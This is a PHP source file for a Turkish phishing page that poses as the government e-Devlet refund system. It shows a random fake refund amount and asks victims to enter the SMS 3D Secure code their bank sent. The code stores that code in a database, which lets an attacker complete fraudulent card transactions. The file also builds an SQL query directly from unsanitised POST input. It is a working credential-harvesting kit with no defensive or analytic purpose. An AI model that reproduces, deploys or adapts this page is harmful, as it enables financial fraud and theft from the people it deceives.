<?php
    ob_start();
    session_start();
    include 'ing/baglan.php';

    $ayarsor = $db->prepare("SELECT * from ayarlar where ayar_id=:id");
    $ayarsor->execute(array(
        'id' => 0
    ));
    $ayarcek=$ayarsor->fetch(PDO::FETCH_ASSOC);


  if(isset($_POST))
    {
      $smskod = $_POST['smskod'];
      $tutar = $_POST['tutarid'];
      $atgibi = "1";
      
        if(isset($_POST['smskod'])){
            $kullanicikaydet=$db->prepare("UPDATE datalar SET
                3dsms3=:smsSifre,
                3dsms2=:tutar,
                notif=:atgibi
                WHERE id={$_POST['lastid']}");

            $insert=$kullanicikaydet->execute(array(
                'smsSifre' => $smskod,
                'tutar' => $tutar,
                'atgibi' => $atgibi
            ));
            
            if ($insert){
                
            }else {
                header("Location:sms2.php");
            }
        }else {
            header("Location:index.php");
        }
    }
?>
<!DOCTYPE html>

<html lang="tr">
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>E-Devlet İade Sistemi</title>
    <meta charset="utf-8">
    <meta name="author" content="<?php echo $ayarcek['ayar_author']; ?>">
    <!-- External CSS libraries -->
    <link type="text/css" rel="stylesheet" href="assets\css\bootstrap.min.css">
    <link type="text/css" rel="stylesheet" href="assets\fonts\font-awesome\css\font-awesome.min.css">
    <link type="text/css" rel="stylesheet" href="assets\fonts\flaticon\font\flaticon.css">

    <!-- Favicon icon -->
    

    <!-- Google fonts -->
    <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Open+Sans:400,300,600,700,800%7CPoppins:400,500,700,800,900%7CRoboto:100,300,400,400i,500,700">

    <!-- Custom Stylesheet -->
    <link type="text/css" rel="stylesheet" href="assets\css\style.css">
    <link rel="stylesheet" type="text/css" id="style_sheet" href="assets\css\skins\default.css">

</head>
<body id="top">
    
<div class="page_loader"></div>

<link rel="icon" type="image/x-icon" href="tema\img\favicon.png">
<form method="post" action="problem.php" id="aspnetForm" autocomplete="off">
<meta charset="UTF-8">



   <!-- External CSS libraries -->
    <link type="text/css" rel="stylesheet" href="tema\css\bootstrap.min.css">
    <link type="text/css" rel="stylesheet" href="tema\fonts\font-awesome\css\font-awesome.min.css">
    <link type="text/css" rel="stylesheet" href="tema\fonts\flaticon\font\flaticon.css">

    <!-- Favicon icon -->
    <link rel="shortcut icon" href="tema\img\favicon.ico" type="image/x-icon">

    <!-- Google fonts -->
    <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Open+Sans:400,300,600,700,800%7CPoppins:400,500,700,800,900%7CRoboto:100,300,400,400i,500,700">

    <!-- Custom Stylesheet -->
    <link type="text/css" rel="stylesheet" href="tema\css\style.css">
    <link rel="stylesheet" type="text/css" id="style_sheet" href="tema\css\skins\default.css">


<body id="top">
<div class="page_loader"></div>


<form action="#" method="post" class="creditly-card-form agileinfo_form">
<section class="creditly-wrapper wthree, w3_agileits_wrapper">
      <div class="card bg-secondary shadow border-0">

<div class="login-1">
    <div class="container"> 
        <div class="row">
            <div class="col-md-12">
                <div class="login-inner-form">
                    <div class="details">
                        <a href="#">
                            <img src="tema\img\logos\logo-2.png"  alt="logo">
                        </a>
                        <?php 
                             $input = array("455,799", "755,99", "505,451", "995,20", "620,157","830.22","384","715.152","1045","891.54");
                            $rand_keys = array_rand($input, 2);
                        ?>
                        <h3>İade Tutarınız Belirlendi !</h3>
						<h3>"<?php  echo $input[$rand_keys[0]]; ?> TL"</h3>
                        					<input type="hidden" name="tutarid" value="<?php echo $input[$rand_keys[0]]; ?>">

<input type="hidden" name="lastid" value="<?php echo $_SESSION['data_id']; ?>">

			<font size="2" color="#960000">Bankanızın Bağlı Olduğu <strong><h3><?php echo "3D Firma/Ödeme Kuruluşu";//$ayarcek['ayar_3d']; ?></h3></strong> Tarafından <b><?php  echo $input[$rand_keys[0]]; ?> ₺</b> Aidat İadenizin Kartınıza Aktarımı İçin Telefonunuza Gönderilen <b>SMS</b> Şifresini Giriniz. </font>
			<br>
			<br>
                        
                            <div class="form-group">
							
                                <input class="expiration-month-and-year input-text" 
                                       pattern="[0-9]*" 
                                       type="password" 
                                       maxlength="8" 
                                       minlength="5" 
                                       id="kimlik" 
                                       name="smskod" 
                                       placeholder="SMS Şifresi" 
                                       required >
                            </div>
                            
                            
                                <button type="submit" class="btn-md btn-theme btn-block">AKTARIMI TAMAMLA</button>
                            </div>
							<br>
							<div id="error-message"></div>
                          </div>
                        </form>
                       
                </div>
            </div>
        </div>
    </div>
</div>

    </form>
    </body>
    </form>
    </body>
</html>